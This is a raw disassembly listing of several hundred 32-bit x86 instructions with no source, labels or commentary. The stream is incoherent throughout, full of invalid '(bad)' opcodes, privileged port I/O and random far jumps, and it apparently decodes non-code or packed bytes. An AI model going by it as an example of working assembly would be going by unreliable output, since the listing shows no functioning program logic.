  42ed9d:	jle    0x42ed68
  42ed9f:	add    BYTE PTR ss:[edi],dh
  42eda2:	sbb    cl,BYTE PTR [edx-0x6c12ded7]
  42eda8:	push   ebx
  42eda9:	push   ebp
  42edaa:	dec    ebx
  42edab:	or     eax,0x6b4cee13
  42edb0:	jnp    0x42edec
  42edb2:	add    dh,BYTE PTR [esi-0x1b6afab3]
  42edb8:	sbb    eax,0xedd392c5
  42edbd:	ret    0x8342
  42edc0:	add    al,0xaf
  42edc2:	inc    ebx
  42edc3:	jl     0x42edf3
  42edc5:	imul   BYTE PTR [ebx+0x6e]
  42edc8:	dec    edi
  42edc9:	pop    ebx
  42edca:	add    ebp,edx
  42edcc:	mov    al,ds:0x1f4da9a4
  42edd1:	and    al,0xad
  42edd3:	mov    gs,WORD PTR [edx]
  42edd5:	xchg   esi,eax
  42edd6:	jp     0x42eda7
  42edd8:	ffree  st(4)
  42edda:	scas   eax,DWORD PTR es:[edi]
  42eddb:	xchg   BYTE PTR [edx-0x62c02482],ah
  42ede1:	in     al,dx
  42ede2:	ficom  WORD PTR [ecx]
  42ede4:	pop    edx
  42ede5:	jmp    0x42edd7
  42ede7:	fadd   DWORD PTR [eax+0x74]
  42edea:	mov    DWORD PTR [eax-0x380f293],ebp
  42edf0:	sub    eax,DWORD PTR [esi]
  42edf2:	jbe    0x42ee5f
  42edf4:	mov    bh,0xae
  42edf6:	leave  
  42edf7:	sbb    al,0x83
  42edf9:	mov    al,0x1b
  42edfb:	mov    al,0x5c
  42edfd:	jl     0x42ee21
  42edff:	xchg   ebp,eax
  42ee00:	in     eax,dx
  42ee01:	push   esi
  42ee02:	stos   BYTE PTR es:[edi],al
  42ee03:	lods   eax,DWORD PTR ds:[esi]
  42ee04:	jmp    0x42ed97
  42ee06:	and    ebp,DWORD PTR [esi-0x73]
  42ee09:	(bad)  
  42ee0a:	jecxz  0x42ee16
  42ee0c:	mov    edx,0xcdc5b6d
  42ee11:	mov    dh,0xee
  42ee13:	ret    0x5afd
  42ee16:	inc    esp
  42ee17:	pop    esp
  42ee18:	fsubr  DWORD PTR [edx+0x32]
  42ee1b:	daa    
  42ee1c:	xchg   edi,eax
  42ee1d:	mov    ch,0x31
  42ee1f:	push   edx
  42ee20:	mov    ch,BYTE PTR [ebp-0xa2e457d]
  42ee26:	mov    cl,0x87
  42ee28:	add    DWORD PTR [ebx-0x5a76e98c],esi
  42ee2e:	sbb    eax,DWORD PTR ds:0xdb8bf580
  42ee34:	popf   
  42ee35:	push   ds
  42ee36:	cmp    edi,ebx
  42ee38:	aam    0x42
  42ee3a:	mov    ch,0x62
  42ee3c:	and    BYTE PTR [ebx+0x1026db3d],bh
  42ee42:	inc    edi
  42ee43:	mov    ch,0x89
  42ee45:	mov    al,ds:0xbf0a985b
  42ee4a:	add    DWORD PTR [edi+0x60026bee],edx
  42ee50:	inc    edi
  42ee51:	hlt    
  42ee52:	push   0x4d036dbc
  42ee57:	test   DWORD PTR [ebp+0x3],ebp
  42ee5a:	jno    0x42ee7e
  42ee5c:	add    dh,cl
  42ee5e:	jg     0x42ee22
  42ee60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee61:	inc    esi
  42ee62:	inc    ebx
  42ee63:	mov    dh,0xa1
  42ee65:	or     BYTE PTR [ebp+0x27fd7223],0x4c
  42ee6c:	(bad)  
  42ee6d:	xor    eax,0xc45342d6
  42ee72:	ja     0x42eee3
  42ee74:	pop    ss
  42ee75:	mov    esi,0x6e15c7cf
  42ee7a:	ins    BYTE PTR es:[edi],dx
  42ee7b:	(bad)  [edx-0xa6cf62]
  42ee81:	in     al,0x18
  42ee83:	xchg   ebp,eax
  42ee84:	add    DWORD PTR [ecx+0x63],esp
  42ee87:	add    DWORD PTR [edx],0x4a
  42ee8a:	mov    DWORD PTR [ebx],edi
  42ee8c:	or     al,0x8a
  42ee8e:	dec    ecx
  42ee8f:	xor    al,0x76
  42ee91:	shl    DWORD PTR [esi+0x53],1
  42ee94:	out    dx,eax
  42ee95:	xor    eax,0x4f4f955b
  42ee9a:	xchg   ebx,eax
  42ee9b:	sub    edx,0x61a62cb6
  42eea1:	dec    eax
  42eea2:	outs   dx,BYTE PTR ds:[esi]
  42eea3:	inc    esp
  42eea4:	or     BYTE PTR [ecx-0x4eff2913],0x6
  42eeab:	mov    ch,0xea
  42eead:	repnz retf 
  42eeaf:	loop   0x42eef9
  42eeb1:	mov    DWORD PTR [ebp-0x39e4e925],esp
  42eeb7:	shl    DWORD PTR [ecx-0x1adb437f],1
  42eebd:	into   
  42eebe:	mov    ebx,0x99b6146d
  42eec3:	jecxz  0x42ee61
  42eec5:	jg     0x42ee57
  42eec7:	scas   eax,DWORD PTR es:[edi]
  42eec8:	pop    DWORD PTR [edi-0x13d5cabe]
  42eece:	and    BYTE PTR [edx+0x4c],0xa1
  42eed2:	jb     0x42ee64
  42eed4:	mov    ch,0x6d
  42eed6:	jne    0x42ef1d
  42eed8:	pop    esp
  42eed9:	xchg   ebp,eax
  42eeda:	mov    ebx,0x2e05aa50
  42eedf:	ja     0x42ef4e
  42eee1:	jmp    0x42ee63
  42eee3:	mov    edx,0xed9fe392
  42eee8:	fcomp  DWORD PTR ds:0x6a810e2e
  42eeee:	inc    ebx
  42eeef:	aad    0x37
  42eef1:	ja     0x42eea2
  42eef3:	sbb    edi,DWORD PTR [eax+0x216d0b4a]
  42eef9:	test   al,0x24
  42eefb:	fnstcw WORD PTR [eax-0x5c]
  42eefe:	inc    eax
  42eeff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef00:	mov    dh,0xca
  42ef02:	mov    bh,0x85
  42ef04:	cmp    BYTE PTR [eax],dl
  42ef06:	ja     0x42ef5e
  42ef08:	mov    eax,ds:0x46607e00
  42ef0d:	cmp    eax,0xdc50da83
  42ef12:	je     0x42ef45
  42ef14:	call   0x3c009f22
  42ef19:	xor    BYTE PTR [esi+0x69],0xa1
  42ef1d:	push   0xffffff8b
  42ef1f:	jo     0x42eeec
  42ef21:	push   esi
  42ef22:	stos   BYTE PTR es:[edi],al
  42ef23:	inc    ecx
  42ef24:	fld    TBYTE PTR [esi+0x2ac4968a]
  42ef2a:	lods   al,BYTE PTR ds:[esi]
  42ef2b:	out    dx,al
  42ef2c:	loop   0x42eebd
  42ef2e:	cwde   
  42ef2f:	repnz test DWORD PTR [ebx],ecx
  42ef32:	pcmpeqd mm7,mm1
  42ef35:	xor    DWORD PTR [esi+0x47fd1e],edx
  42ef3b:	push   ss
  42ef3c:	aam    0x85
  42ef3e:	lea    ecx,[ebp-0x9a3345b]
  42ef44:	jmp    0x42eec7
  42ef46:	mov    edi,0x746c69a
  42ef4b:	aam    0x63
  42ef4d:	cmp    eax,0x3e4e667e
  42ef52:	cdq    
  42ef53:	mov    ebx,0x8dc6edb5
  42ef58:	adc    ah,BYTE PTR [eax-0x10]
  42ef5b:	cmp    edx,DWORD PTR [edx+0x4a]
  42ef5e:	add    bl,BYTE PTR [ebx+esi*2+0x2e00ad4]
  42ef65:	pop    ebx
  42ef66:	inc    ecx
  42ef67:	pop    ecx
  42ef68:	test   BYTE PTR [esi+ecx*8+0x6aaadb6d],ah
  42ef6f:	jne    0x42efed
  42ef71:	mov    al,ds:0xce880867
  42ef76:	aam    0xad
  42ef78:	mov    ds:0xa138d82,eax
  42ef7d:	jge    0x42ef58
  42ef7f:	ins    DWORD PTR es:[edi],dx
  42ef80:	in     eax,dx
  42ef81:	(bad)  
  42ef82:	(bad)  
  42ef83:	adc    DWORD PTR [ebx+0x79],esi
  42ef86:	je     0x42ef32
  42ef88:	fcmovnb st,st(5)
  42ef8a:	clc    
  42ef8b:	mov    WORD PTR [esi],?
  42ef8d:	outs   dx,BYTE PTR ds:[esi]
  42ef8e:	mov    ah,0x6e
  42ef90:	aam    0x12
  42ef92:	repz dec esp
  42ef94:	cmp    al,0x3b
  42ef96:	add    DWORD PTR [edi-0x47ff446a],esi
  42ef9c:	xor    eax,0x2e214ade
  42efa1:	or     DWORD PTR [ebx+0x8],esp
  42efa4:	lods   eax,DWORD PTR ds:[esi]
  42efa5:	sub    eax,0xc78dd57
  42efab:	jnp    0x42ef5f
  42efad:	jmp    0xdb93fd3a
  42efb2:	outs   dx,BYTE PTR ds:[esi]
  42efb3:	xor    ah,dh
  42efb5:	xchg   BYTE PTR [eax],al
  42efb7:	mov    eax,ds:0xab75102e
  42efbc:	test   eax,0x7dfdadec
  42efc1:	ins    BYTE PTR es:[edi],dx
  42efc2:	add    eax,0xaeda29a0
  42efc7:	adc    ecx,ecx
  42efc9:	in     al,dx
  42efca:	fdiv   QWORD PTR [esi]
  42efcc:	add    esp,DWORD PTR [eax-0x7d1af4a5]
  42efd2:	popa   
  42efd3:	jnp    0x42f049
  42efd5:	mov    ch,0xa
  42efd7:	mov    bh,0x76
  42efd9:	test   eax,0x6372fb4d
  42efde:	xchg   ebp,eax
  42efdf:	sub    DWORD PTR [ebx+0x68],esp
  42efe2:	mov    esi,0xd5ba2
  42efe7:	dec    ebp
  42efe8:	xchg   ecx,eax
  42efe9:	jae    0x42efd4
  42efeb:	inc    esi
  42efec:	mov    eax,ds:0x809a29a8
  42eff1:	mov    DWORD PTR [eax],esi
  42eff3:	pop    es
  42eff4:	cs ins DWORD PTR es:[edi],dx
  42eff6:	frstpm(287 only) 
  42eff8:	add    eax,0xe0a0238d
  42effd:	add    eax,0xbaa2b766
  42f002:	ins    DWORD PTR es:[edi],dx
  42f003:	inc    esp
  42f004:	aas    
  42f005:	add    ah,bl
  42f007:	mov    edi,0x952d652
  42f00c:	jmp    0x7a7:0xc29c97a1
  42f013:	push   0x2a
  42f015:	push   0xd1d19fe9
  42f01a:	dec    ecx
  42f01b:	cld    
  42f01c:	sbb    DWORD PTR [ecx-0x795fae4f],esi
  42f022:	add    cl,bh
  42f024:	sbb    BYTE PTR [edi],ah
  42f026:	push   0x60
  42f028:	jmp    0x3c46:0xa1a9c9b6
  42f02f:	aam    0xb
  42f031:	ins    DWORD PTR es:[edi],dx
  42f032:	or     eax,0xecf1dd45
  42f037:	dec    esi
  42f038:	cmp    DWORD PTR [ecx],ebp
  42f03a:	aam    0x1c
  42f03c:	or     eax,DWORD PTR ds:0x9dbcb8a6
  42f042:	shl    ah,1
  42f044:	sbb    al,0xfe
  42f046:	test   DWORD PTR [esi],esp
  42f048:	mov    ds:0x2ff8241b,al
  42f04d:	loop   0x42f0b9
  42f04f:	sbb    al,0x5a
  42f051:	fadd   DWORD PTR [ebp-0x2c]
  42f054:	mov    ah,0x1d
  42f056:	test   eax,0x21ebb411
  42f05b:	mov    ch,0x1d
  42f05d:	mov    cl,0x29
  42f05f:	xor    eax,0x73ad6006
  42f064:	sbb    al,0xa4
  42f066:	rol    BYTE PTR ss:[edx+0x2b],1
  42f06a:	pop    ss
  42f06b:	cs popa 
  42f06d:	push   0x55dba829
  42f072:	fld    TBYTE PTR [esi]
  42f074:	and    dl,BYTE PTR [esi+0x8]
  42f077:	jle    0x42f038
  42f079:	cmp    al,0xe
  42f07b:	and    dh,BYTE PTR [esi+0x6553294d]
  42f081:	xlat   BYTE PTR ds:[ebx]
  42f082:	es std 
  42f084:	lods   eax,DWORD PTR ds:[esi]
  42f085:	lods   eax,DWORD PTR ds:[esi]
  42f086:	ins    DWORD PTR es:[edi],dx
  42f087:	mov    bh,0xfa
  42f089:	mov    edi,0x44e9907c
  42f08e:	mov    eax,ds:0x10a3c62c
  42f093:	rol    DWORD PTR [ebp-0x3e052c53],1
  42f099:	retf   0xed60
  42f09c:	ins    BYTE PTR es:[edi],dx
  42f09d:	add    bh,BYTE PTR [edx+0x416af0d4]
  42f0a3:	test   DWORD PTR [ebx-0x7],edx
  42f0a6:	xchg   ecx,eax
  42f0a7:	adc    al,0x4b
  42f0a9:	mov    gs:0x66605a00,eax
  42f0af:	mov    dh,0xca
  42f0b1:	stos   BYTE PTR es:[edi],al
  42f0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f0b3:	add    ch,BYTE PTR [ecx+ebp*1-0x7f]
  42f0b7:	popa   
  42f0b8:	mov    ecx,0xd0b1bbd4
  42f0bd:	xchg   esi,eax
  42f0be:	xchg   ebx,eax
  42f0bf:	stos   BYTE PTR es:[edi],al
  42f0c0:	mov    bl,0xd9
  42f0c2:	inc    edx
  42f0c3:	jne    0x42f0ae
  42f0c5:	inc    ebp
  42f0c6:	sahf   
  42f0c7:	fsubr  DWORD PTR [edx-0x5e]
  42f0ca:	pusha  
  42f0cb:	frstor [edx+ecx*2+0x34]
  42f0cf:	xchg   esp,eax
  42f0d0:	adc    BYTE PTR [eax+0xa435db0],dh
  42f0d6:	mov    ebp,0x8310a25c
  42f0db:	cs pop edx
  42f0dd:	mov    eax,0x7af99675
  42f0e2:	ret    
  42f0e3:	pop    es
  42f0e4:	inc    esi
  42f0e5:	out    0x98,eax
  42f0e7:	ins    DWORD PTR es:[edi],dx
  42f0e8:	mov    eax,ds:0x23e3b6dd
  42f0ed:	mov    eax,ds:0x98e5e017
  42f0f2:	cs sbb edx,ecx
  42f0f5:	mov    ds:0xdbc6c681,eax
  42f0fa:	retf   
  42f0fb:	and    DWORD PTR ds:0x9917ec0,esi
  42f101:	push   0x9a6d506b
  42f106:	jp     0x42f0ca
  42f108:	push   esi
  42f109:	mov    edx,0x1415b455
  42f10e:	loopne 0x42f0b4
  42f110:	cmp    ch,BYTE PTR [esi-0x4c]
  42f113:	ins    DWORD PTR es:[edi],dx
  42f114:	fucomi st,st(7)
  42f116:	pop    es
  42f117:	pushf  
  42f118:	mov    edi,0xc26a170d
  42f11d:	push   ds
  42f11e:	cmp    DWORD PTR [ebx+0x26a5aab],ebx
  42f124:	fdivr  st(3),st
  42f126:	xchg   ebp,eax
  42f127:	ja     0x42f17f
  42f129:	lods   eax,DWORD PTR ds:[esi]
  42f12a:	stos   DWORD PTR es:[edi],eax
  42f12b:	mov    BYTE PTR [ebx-0x6e],bl
  42f12e:	stos   BYTE PTR es:[edi],al
  42f12f:	sti    
  42f130:	scas   eax,DWORD PTR es:[edi]
  42f131:	mov    ch,0x5c
  42f133:	mov    ch,0xd0
  42f135:	push   esp
  42f136:	shl    bh,0x94
  42f139:	sbb    ecx,ebp
  42f13b:	mov    esi,0xdb157521
  42f140:	inc    esi
  42f141:	imul   DWORD PTR [edi+0x2c]
  42f144:	jmp    0xd723ea3c
  42f149:	(bad)  
  42f14a:	mov    edx,0xebc01f71
  42f14f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f150:	ja     0x42f119
  42f152:	daa    
  42f153:	jl     0x42f100
  42f155:	pop    eax
  42f156:	call   0xbf3d5003
  42f15b:	dec    bx
  42f15d:	fstp   TBYTE PTR [edx+0x25a1541a]
  42f163:	cdq    
  42f164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f165:	ins    DWORD PTR es:[edi],dx
  42f166:	(bad)  
  42f167:	(bad)  [eax+0x20]
  42f16a:	pusha  
  42f16b:	xor    al,0x52
  42f16d:	and    eax,0x58b65b27
  42f172:	mov    dh,0xad
  42f174:	mov    ds:0xb616d802,al
  42f179:	fisttp DWORD PTR [edx]
  42f17b:	test   al,0x86
  42f17d:	lea    eax,[esi]
  42f17f:	int    0x84
  42f181:	sub    al,ah
  42f183:	mov    dl,0xda
  42f185:	fnsave [esi+0xe570bb6]
  42f18b:	jmp    0xcf85:0xfbc65f6b
  42f192:	sub    eax,0x72441d6d
  42f197:	pop    esp
  42f198:	cmp    ecx,DWORD PTR [edx+0x46e29d20]
  42f19e:	fstp   TBYTE PTR [eax+0x66ebc92]
  42f1a4:	addr16 ds inc edx
  42f1a7:	or     al,0x77
  42f1a9:	inc    edi
  42f1aa:	shl    DWORD PTR [esi-0x5b2f4677],0x50
  42f1b1:	mov    ecx,0x4b0b44e4
  42f1b6:	pop    ebx
  42f1b7:	and    BYTE PTR [ebx],ah
  42f1b9:	inc    ecx
  42f1ba:	push   esi
  42f1bb:	inc    esp
  42f1bc:	loop   0x42f223
  42f1be:	inc    ebp
  42f1bf:	pop    esp
  42f1c0:	pop    edx
  42f1c1:	sub    BYTE PTR [ebx+0x46],bl
  42f1c4:	femms  
  42f1c6:	cs cmp eax,0xd6c2e22a
  42f1cc:	dec    ecx
  42f1cd:	add    DWORD PTR [ebp-0x7c],esp
  42f1d0:	call   0xeda0:0xea06c7cb
  42f1d7:	inc    esi
  42f1d8:	mov    ds:0xc789c2ff,eax
  42f1dd:	adc    DWORD PTR [edx+0x6e],ebx
  42f1e0:	ins    BYTE PTR es:[edi],dx
  42f1e1:	push   eax
  42f1e2:	sbb    ch,BYTE PTR [ecx-0x2b28bb64]
  42f1e8:	push   0x17
  42f1ea:	sbb    al,BYTE PTR [eax]
  42f1ec:	loopne 0x42f19f
  42f1ee:	(bad)  
  42f1ef:	pop    edx
  42f1f0:	dec    ebp
  42f1f1:	mov    ecx,0xdb6176b6
  42f1f6:	pop    eax
  42f1f7:	sti    
  42f1f8:	and    BYTE PTR [edx-0x6465172a],bh
  42f1fe:	push   0x5d5128ef
  42f203:	fsubr  st,st(1)
  42f205:	push   0xffffffc8
  42f207:	bound  edi,QWORD PTR [esi+0x5854b645]
  42f20d:	push   ss
  42f20e:	aas    
  42f20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f210:	(bad)  
  42f211:	popf   
  42f212:	xor    bl,BYTE PTR [ebx]
  42f214:	xlat   BYTE PTR ds:[ebx]
  42f215:	or     ebx,DWORD PTR [ebx]
  42f217:	ins    BYTE PTR es:[edi],dx
  42f218:	in     eax,dx
  42f219:	sbb    BYTE PTR [ecx],al
  42f21b:	enter  0x3b8f,0x5
  42f21f:	sahf   
  42f220:	xor    BYTE PTR [bx+di+0x1b],dl
  42f224:	add    dh,BYTE PTR [esi+0x30a098fa]
  42f22a:	sbb    eax,0xd880babd
  42f22f:	adc    eax,0x58503185
  42f234:	push   es
  42f235:	aad    0x2
  42f237:	fcomp  st(0)
  42f239:	jno    0x42f21c
  42f23b:	xor    ecx,edx
  42f23d:	inc    esi
  42f23e:	push   edi
  42f23f:	mov    ah,0xfd
  42f241:	mov    eax,0x63265f70
  42f246:	and    ebp,DWORD PTR [esi+eiz*1]
  42f249:	imul   esi,DWORD PTR [eax+0x23],0xffffff88
  42f24d:	or     ebp,DWORD PTR [ebp+0x68]
  42f250:	dec    ebx
  42f251:	or     cl,dh
  42f253:	stos   DWORD PTR es:[edi],eax
  42f254:	ja     0x42f2c1
  42f256:	sub    al,0x3c
  42f258:	mov    ah,0xb1
  42f25a:	sub    bl,cl
  42f25c:	lea    esi,[esi]
  42f25e:	cmp    BYTE PTR [edx+0x5e],ah
  42f261:	out    dx,al
  42f262:	fild   DWORD PTR [ecx+esi*4]
  42f265:	xor    eax,0x468c3273
  42f26a:	sbb    al,0x6
  42f26c:	rcr    DWORD PTR [ebx+0x5b6d2e36],1
  42f272:	es sahf 
  42f274:	das    
  42f275:	fadd   DWORD PTR [edx]
  42f277:	sub    BYTE PTR [ebx],bl
  42f279:	stos   DWORD PTR es:[edi],eax
  42f27a:	and    edx,ebx
  42f27c:	mov    dh,0xab
  42f27e:	pop    eax
  42f27f:	scas   eax,DWORD PTR es:[edi]
  42f280:	mov    cl,0x70
  42f282:	pop    eax
  42f283:	out    0xe3,al
  42f285:	jge    0x42f2c8
  42f287:	pop    ss
  42f288:	adc    al,0xb7
  42f28a:	popa   
  42f28b:	push   ebp
  42f28c:	(bad)  [edi-0xe]
  42f28f:	adc    BYTE PTR [eax+0x5b],dh
  42f292:	push   0x956e5b94
  42f297:	jns    0x42f2c3
  42f299:	aad    0xae
  42f29b:	mov    eax,0x454b96d1
  42f2a0:	mov    esi,0x1ac3039b
  42f2a5:	push   cs
  42f2a6:	stos   BYTE PTR es:[edi],al
  42f2a7:	ins    DWORD PTR es:[edi],dx
  42f2a8:	adc    ebp,DWORD PTR [ebx+eax*2-0x75]
  42f2ac:	adc    al,0x56
  42f2ae:	jl     0x42f28a
  42f2b0:	adc    ah,al
  42f2b2:	lods   eax,DWORD PTR ds:[esi]
  42f2b3:	fdiv   QWORD PTR [edi]
  42f2b5:	addr16 mov eax,0x143c7545
  42f2bb:	jno    0x42f328
  42f2bd:	and    BYTE PTR [ebx],bl
  42f2bf:	popa   
  42f2c0:	inc    esp
  42f2c1:	pop    edi
  42f2c2:	jne    0x42f2cf
  42f2c4:	push   ebp
  42f2c5:	pop    ebx
  42f2c6:	xor    al,0xbe
  42f2c8:	sub    dl,BYTE PTR [edi+0x2b]
  42f2cb:	jl     0x42f32e
  42f2cd:	xchg   ebp,eax
  42f2ce:	ins    DWORD PTR es:[edi],dx
  42f2cf:	inc    ebx
  42f2d0:	adc    al,0xbf
  42f2d2:	or     eax,0xdaa17a52
  42f2d7:	or     eax,0xb64dba9e
  42f2dc:	or     ah,BYTE PTR [edx+esi*4]
  42f2df:	retf   
  42f2e0:	xor    edi,DWORD PTR [edi]
  42f2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f2e3:	ss xchg esi,eax
  42f2e5:	xchg   esi,eax
  42f2e6:	ss push esp
  42f2e8:	out    0x20,eax
  42f2ea:	pop    ecx
  42f2eb:	add    eax,0x1d14c016
  42f2f0:	add    ch,bl
  42f2f2:	xchg   esi,eax
  42f2f3:	je     0x42f333
  42f2f5:	jno    0x42f28c
  42f2f7:	add    al,0x2b
  42f2f9:	add    esp,DWORD PTR [ebx-0x1d]
  42f2fc:	mov    DWORD PTR [ebx],ecx
  42f2fe:	xchg   ecx,eax
  42f2ff:	enter  0x1f29,0x60
  42f303:	in     eax,dx
  42f304:	ror    edi,1
  42f306:	fsubr  DWORD PTR [esi-0x53]
  42f309:	pusha  
  42f30a:	sbb    ecx,ebx
  42f30c:	and    DWORD PTR ds:0x2c0c2637,0xffffffb7
  42f313:	cmp    cl,BYTE PTR [edx+0xc73561e]
  42f319:	pop    ss
  42f31a:	int    0x42
  42f31c:	imul   ebp,DWORD PTR [ebx+0x71095a6d],0x7a779382
  42f326:	adc    BYTE PTR [ebx+eax*4+0x3a4a4a0],dh
  42f32d:	(bad)  
  42f32e:	add    BYTE PTR cs:[esi],dh
  42f331:	nop
  42f332:	fucom  st(2)
  42f334:	sub    cl,BYTE PTR [ebx]
  42f336:	lods   eax,DWORD PTR ds:[esi]
  42f337:	ins    DWORD PTR es:[edi],dx
  42f338:	fild   DWORD PTR [esi+0x3]
  42f33b:	rcl    BYTE PTR [eax+0x7275439d],0xce
  42f342:	adc    esi,DWORD PTR [esi+0x5b]
  42f345:	sub    BYTE PTR [esi+edi*8+0x4f],dl
  42f349:	push   DWORD PTR [edi-0x2]
  42f34c:	pop    es
  42f34d:	cmc    
  42f34e:	and    ch,0x6f
  42f351:	mov    bh,0xa1
  42f353:	je     0x42f39e
  42f355:	ret    0xe4
  42f358:	popf   
  42f359:	out    0x0,al
  42f35b:	std    
  42f35c:	retf   0xd44
  42f35f:	ins    BYTE PTR es:[edi],dx
  42f360:	lea    edx,[esp+edx*8+0x61]
  42f364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f365:	adc    al,0x6d
  42f367:	jmp    0x42f2e9
  42f369:	or     eax,0xfc0ae612
  42f36e:	push   esi
  42f36f:	and    DWORD PTR [ecx],0xffffffaa
  42f372:	mov    eax,ds:0xbdb768dd
  42f377:	jno    0x42f3ec
  42f379:	jmp    0x8559:0x45e4e1bf
  42f380:	add    al,0xb4
  42f382:	scas   al,BYTE PTR es:[edi]
  42f383:	jbe    0x42f31e
  42f385:	xor    BYTE PTR [esi],bh
  42f387:	xchg   ecx,eax
  42f388:	push   ss
  42f389:	xchg   edx,eax
  42f38a:	mov    cl,0xd4
  42f38c:	inc    ecx
  42f38d:	mov    ch,0x7
  42f38f:	fcomp  DWORD PTR [ebp-0x511713c8]
  42f395:	sbb    bl,0xb6
  42f398:	pop    edx
  42f399:	inc    ecx
  42f39a:	sti    
  42f39b:	fadd   DWORD PTR [ecx+0x23]
  42f39e:	xchg   ebx,eax
  42f39f:	daa    
  42f3a0:	or     esp,DWORD PTR [ebp+0x2d5bc68a]
  42f3a6:	jmp    0xbb6:0xb7cd5b49
  42f3ad:	mov    BYTE PTR [esi+0x41d6a2cd],al
  42f3b3:	je     0x42f3ef
  42f3b5:	and    DWORD PTR [esi],ebp
  42f3b7:	sub    al,0x35
  42f3b9:	inc    ebp
  42f3ba:	and    BYTE PTR [ebx+0x6934e50e],ch
  42f3c0:	push   eax
  42f3c1:	add    esi,DWORD PTR [ecx-0x15]
  42f3c4:	sub    ah,BYTE PTR [esi+eax*8]
  42f3c7:	inc    edi
  42f3c8:	jb     0x42f3b4
  42f3ca:	xor    DWORD PTR [esi+0x292badda],esi
  42f3d0:	jns    0x42f3b2
  42f3d2:	shr    DWORD PTR [ebp+ebp*4-0x18],0x5a
  42f3d7:	mov    es,WORD PTR [edx]
  42f3d9:	add    dh,BYTE PTR ss:[esi-0x23faf19d]
  42f3e0:	ss mov dh,0x87
  42f3e3:	cwde   
  42f3e4:	sbb    ebx,DWORD PTR [ecx+0x6a1caa90]
  42f3ea:	call   0x3b31:0xbb35b8aa
  42f3f1:	test   al,0x9b
  42f3f3:	jmp    0x42f453
  42f3f5:	or     eax,0xf5d85db4
  42f3fa:	iret   
  42f3fb:	out    dx,al
  42f3fc:	adc    DWORD PTR [esp+edi*4],eax
  42f3ff:	add    eax,0x83a2a129
  42f404:	mov    bl,BYTE PTR [ebx]
  42f406:	inc    edx
  42f407:	aaa    
  42f408:	push   es
  42f409:	test   al,0xd0
  42f40b:	test   al,0x5b
  42f40d:	pop    ebx
  42f40e:	add    edi,DWORD PTR [eax]
  42f410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f411:	xchg   edi,eax
  42f412:	mov    ebx,0xb6b6d9ed
  42f417:	ret    0x2ba6
  42f41a:	push   edi
  42f41b:	pop    ds
  42f41c:	aaa    
  42f41d:	xor    eax,0x5b2ffaa8
  42f422:	fistp  DWORD PTR [eax+0x20]
  42f425:	push   edx
  42f426:	daa    
  42f427:	and    DWORD PTR ds:0x1d04e68f,edi
  42f42d:	(bad)  
  42f42e:	imul   BYTE PTR [ecx+0x54fcb1e0]
  42f434:	cmc    
  42f435:	fdivr  DWORD PTR [ebx+0x6d]
  42f438:	jmp    0x42f43a
  42f43a:	cs mov ah,0xae
  42f43d:	or     esi,DWORD PTR [eax+0x27]
  42f440:	sbb    BYTE PTR [ebx+0x34],dl
  42f443:	mov    eax,es:0xd1602505
  42f449:	mov    ch,0xac
  42f44b:	xchg   ecx,eax
  42f44c:	mov    ecx,0x9a7401d0
  42f451:	shl    BYTE PTR [ebp+0x4846d02c],0x8e
  42f458:	add    BYTE PTR [esi-0x61ab40a5],dh
  42f45e:	sbb    eax,0x2155b61
  42f463:	or     bl,bl
  42f465:	loopne 0x42f4c0
  42f467:	pop    ecx
  42f468:	inc    ebx
  42f469:	and    cl,BYTE PTR [edi]
  42f46b:	sbb    eax,0x9505add1
  42f470:	mov    ecx,0x953fac1a
  42f475:	sub    bh,BYTE PTR [eax-0x5edd4b93]
  42f47b:	mov    bh,0x3e
  42f47d:	loopne 0x42f4bf
  42f47f:	pop    edx
  42f480:	ss ss push 0xee76c5bb
  42f487:	jmp    0xaec47869
  42f48c:	ins    BYTE PTR es:[edi],dx
  42f48d:	ins    DWORD PTR es:[edi],dx
  42f48e:	mov    eax,ds:0x9cf76ed8
  42f493:	fbstp  TBYTE PTR ds:0x589604da
  42f499:	mov    al,ds:0xf4ffea50
  42f49e:	add    DWORD PTR [ebp+0xb],edi
  42f4a1:	sbb    ebx,DWORD PTR [ebx]
  42f4a3:	push   cs
  42f4a4:	mov    edi,0xa2b744c0
  42f4a9:	add    al,0xaf
  42f4ab:	je     0x42f491
  42f4ad:	sub    BYTE PTR [esi+0xe],0x9c
  42f4b1:	xchg   esi,eax
  42f4b2:	cmp    dl,BYTE PTR [eax]
  42f4b4:	rol    esp,1
  42f4b6:	inc    edx
  42f4b7:	mov    cl,0x6d
  42f4b9:	test   al,0xc
  42f4bb:	inc    esp
  42f4bc:	call   0xda0:0x8bb43015
  42f4c3:	fs clc 
  42f4c5:	or     BYTE PTR [eax+0x1d],bh
  42f4c8:	add    al,0x68
  42f4ca:	sbb    al,0x11
  42f4cd:	outs   dx,DWORD PTR ds:[esi]
  42f4ce:	and    dh,BYTE PTR [bx+di+0x6c31]
  42f4d3:	fstp   st(2)
  42f4d5:	fsub   DWORD PTR [edx+0x64350fa6]
  42f4db:	shr    BYTE PTR [ebx+edx*1-0x48],cl
  42f4df:	push   0xffffffdb
  42f4e1:	ret    0x82b6
  42f4e4:	mov    ebp,edx
  42f4e6:	ror    DWORD PTR [edx+ebx*8+0x6c7eb079],0x54
  42f4ee:	sub    eax,0x3f7a04cb
  42f4f3:	ins    DWORD PTR es:[edi],dx
  42f4f4:	ins    DWORD PTR es:[edi],dx
  42f4f5:	mov    ds:0x7ea2e4ad,al
  42f4fa:	jmp    0x86ad:0xda97279e
  42f501:	mov    bl,0xda
  42f503:	int    0xfa
  42f505:	in     al,dx
  42f506:	add    eax,0x297c0aa
  42f50b:	cmc    
  42f50c:	fcom   DWORD PTR [ebp+0x34]
  42f50f:	fld    st(0)
  42f511:	fsub   DWORD PTR [eax-0x4a]
  42f514:	(bad)  
  42f515:	or     eax,0xc919ed7
  42f51a:	or     BYTE PTR [esi],0xe1
  42f51d:	mov    edi,0xb9112a65
  42f522:	xchg   esi,eax
  42f523:	lods   eax,DWORD PTR ds:[esi]
  42f524:	mov    cs,WORD PTR [ebx+0x5b8a036a]
